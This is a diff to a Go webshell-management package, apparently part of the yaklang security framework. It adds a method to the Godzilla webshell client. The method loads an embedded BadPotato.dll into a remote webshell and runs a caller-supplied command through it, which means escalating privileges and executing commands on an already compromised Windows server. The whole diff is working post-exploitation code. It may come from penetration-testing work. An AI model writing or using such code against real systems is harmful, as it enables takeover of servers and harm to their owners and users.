@@ -3,6 +3,7 @@ package wsm
 import (
 	"errors"
 	"github.com/yaklang/yaklang/common/utils"
+	"github.com/yaklang/yaklang/common/wsm/payloads"
 	"github.com/yaklang/yaklang/common/wsm/payloads/godzilla/plugin"
 	"strings"
 )
@@ -158,3 +159,21 @@ func (g *Godzilla) DumpWebappComponent(classname string) ([]byte, error) {
 func (g *Godzilla) CustomClassByteCodeDealer(classBytes []byte) (bool, error) { return false, nil }
 
 func (g *Godzilla) InvokeCustomPlugin() ([]byte, error) { return nil, nil }
+
+func (g *Godzilla) LoadPotatoPlugin(cmd string) ([]byte, error) {
+	var loadState bool
+	binCode, err := payloads.CshrapPluginPayload.ReadFile("godzilla/static/plugin/BadPotato.dll")
+	if err != nil {
+		return nil, err
+	}
+	loadState, err = g.Include("BadPotato.Run", binCode)
+	if err != nil {
+		return nil, err
+	}
+	if !loadState {
+		return nil, utils.Errorf("load plugin failed %s", "BadPotato.dll")
+	}
+	reqParameter := newParameter()
+	reqParameter.AddString("cmd", cmd)
+	return g.EvalFunc("BadPotato.Run", "run", reqParameter)
+}
